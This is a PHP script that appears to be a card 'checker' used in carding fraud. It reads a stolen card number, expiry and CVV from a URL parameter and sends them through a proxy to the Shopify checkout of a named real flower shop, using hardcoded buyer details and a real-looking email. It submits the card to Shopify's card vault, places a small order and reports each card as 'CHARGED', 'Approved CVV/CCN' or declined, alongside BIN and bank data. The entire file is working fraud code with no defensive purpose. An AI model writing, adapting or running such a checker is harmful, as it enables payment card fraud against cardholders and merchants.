<?php
set_time_limit(0);
error_reporting(1);

$cookie = "data/".str_shuffle("cookie_checker".rand(0,1000)). ".txt";
$second = 000000;
$card = $_GET["lista"];
$array = explode("|", $card);
$cc = $array[0];
$mes = $array[1];
$ano = $array[2];
$mes1 = str_replace(0,"",$mes);
$ano1 = str_replace(20,"",$ano);
$cvv = $array[3];


include("bin.php");
include("proxy.php");
$ano = '20'.$ano1;  

    
$sess = vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex(random_bytes(16)), 4));

$mid = vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex(random_bytes(16)), 4));

$sid = vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex(random_bytes(16)), 4));


function value($str,$find_start,$find_end){
$start = @strpos($str,$find_start);
if ($start === false){
    return "";
}
$length = strlen($find_start);
$end    = strpos(substr($str,$start +$length),$find_end);
return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor){
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
}

function getcapture($str, $starting_word, $ending_word){
$subtring_start  = strpos($str, $starting_word);
$subtring_start += strlen($starting_word);
$size            = strpos($str, $ending_word, $subtring_start) - $subtring_start;
return substr($str, $subtring_start, $size);
};


$F = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzgfghjfjfjf'), 0, 6);
$L = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzgfghjfjfjf'), 0, 10);
$C = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzgfghjfjfjf'), 0, 8);
$E = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzgfghjfjfjf'), 0, 8);



$ch = curl_init('https://www.theflowerbulbfarm.com/cart/43440682696947:1?traffic_source=buy_now');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXY, host.":".port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, user.":".pass);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'method: GET',
'content-type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
'Pragma: no-cache',
'Accept: */*',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
$r1 = curl_exec($ch);
curl_close($ch);

$url = trim(strip_tags(getstr($r1, '"url":"', '?')));
$link = str_replace("\/","/",$url);
$TK = trim(strip_tags(getstr($r1, 'name="authenticity_token" value="', '"')));



////////////////[ 2 req ]/////////////


$ch = curl_init($link);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXY, host.":".port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, user.":".pass);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'method: POST',
'content-type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
'Pragma: no-cache',
'Accept: */*',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$TK.'&previous_step=contact_information&step=payment_method&checkout%5Bemail%5D=karimgaming63%40gmail.com&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbuyer_accepts_marketing%5D=1&checkout%5Bbilling_address%5D%5Bfirst_name%5D=&checkout%5Bbilling_address%5D%5Blast_name%5D=&checkout%5Bbilling_address%5D%5Baddress1%5D=&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bcity%5D=&checkout%5Bbilling_address%5D%5Bcountry%5D=&checkout%5Bbilling_address%5D%5Bprovince%5D=&checkout%5Bbilling_address%5D%5Bzip%5D=&checkout%5Bbilling_address%5D%5Bphone%5D=&checkout%5Bbilling_address%5D%5Bcountry%5D=United+Kingdom&checkout%5Bbilling_address%5D%5Bfirst_name%5D=Charlie&checkout%5Bbilling_address%5D%5Blast_name%5D=Gray&checkout%5Bbilling_address%5D%5Baddress1%5D=Chepstow+Road+Llangeview&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bcity%5D=Usk&checkout%5Bbilling_address%5D%5Bzip%5D=NP15+1ES&checkout%5Bbilling_address%5D%5Bphone%5D=2586934851&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bclient_details%5D%5Bbrowser_width%5D=360&checkout%5Bclient_details%5D%5Bbrowser_height%5D=652&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-180');
$r2 = curl_exec($ch);
curl_close($ch);

$TK1 = trim(strip_tags(getstr($r2, 'name="authenticity_token" value="', '"')));

////////////////[ 3 req ]/////////////



$ch = curl_init($link);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXY, host.":".port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, user.":".pass);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'method: POST',
'content-type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
'Pragma: no-cache',
'Accept: */*',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$TK1.'&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D=shopify-Standard%2520%28Lieferzeit%25201-3%2520Tage%29-4.95&button=');
$r2 = curl_exec($ch);
curl_close($ch);





$ch = curl_init('https://deposit.us.shopifycs.com/sessions');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXY, host.":".port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, user.":".pass);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
'method: POST',
'content-type: application/json',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
'Pragma: no-cache',
'Accept: */*',
]);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"'.$cc.'","name":"ahmed","month":'.$mes1.',"year":'.$ano.',"verification_value":"'.$cvv.'"},"payment_session_scope":"www.theflowerbulbfarm.com"}');
$r3 = curl_exec($ch);
curl_close($ch);
$id = json_decode($r3,1)["id"];



$ch = curl_init($link);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXY, host.":".port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, user.":".pass);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'method: POST',
'content-type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
'Pragma: no-cache',
'Accept: */*',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$TK1.'&previous_step=payment_method&step=&s='.$id.'&checkout%5Bpayment_gateway%5D=85532016883&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Btotal_price%5D=1000&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=360&checkout%5Bclient_details%5D%5Bbrowser_height%5D=652&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-180');
$r5 = curl_exec($ch);
curl_close($ch);

usleep(5 + $second);


$ch = curl_init($link."?from_processing_page=1&validate=true");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXY, host.":".port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, user.":".pass);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'method: POST',
'content-type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
'Pragma: no-cache',
'Accept: */*',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
$r6 = curl_exec($ch);
curl_close($ch);





$msg = trim(strip_tags(getstr($r6, 'class="notice__content"><p class="notice__text">', '</p></div></div>')));

$gate = "Shopify+Braintree 9.44$";
if((strpos($r6, 'Your order is confirmed'))  || strpos($r6, 'placed') ||strpos($r6, 'Thank you for your purchase!') || strpos($r6, 'Thanks for supporting') || (strpos($r6, '<div class="webform-confirmation">'))) {
$status = "CHARGED";
$message = "Order placed";
$emoji = "✅";

} elseif(strpos($r6, 'Billing address info was not matched by the processor')) {
 $status = "Approvedd AVS";
$message = "Billing address info was not matched by the processor";
$emoji = "✅";

} elseif(strpos($r6, 'Insufficient Funds')) {
 $status = "Approvedd CVV";
$message = "2001 Insufficient Funds";
$emoji = "✅";

}elseif(strpos($r6, 'Security code was not matched by the processor')){
$status = "Approved CCN";
$message = "Security code was not matched by the processor";
$emoji = "✅";

} else {
$status = "declined";
$message = $msg;
$emoji = "❌";
}


unlink($cookie);
echo json_encode([
"status"=>true,
"card"=>$card,
"cards"=>[
"card"=>$cc,
"month"=>$mes,
"year"=>$ano,
"cvv"=>$cvv,
],
"check"=>$status,
"result"=>$message ?? "Unknow",
"gate"=>$gate,
"emoji"=>$emoji,
"proxy"=>$proxy_ip,
"status_proxy"=>$status_proxy,
"bin"=>$bin,
"bank"=>$bank ?? "Unknow",
"country"=>$country ?? "Unknow",
"flag"=>$flag ?? "Unknow",
"scheme"=>$scheme ?? "Unknow",
"type"=>$type ?? "Unknow",
"brand"=>$brand ?? "Unknow"
],64|128|256);

?>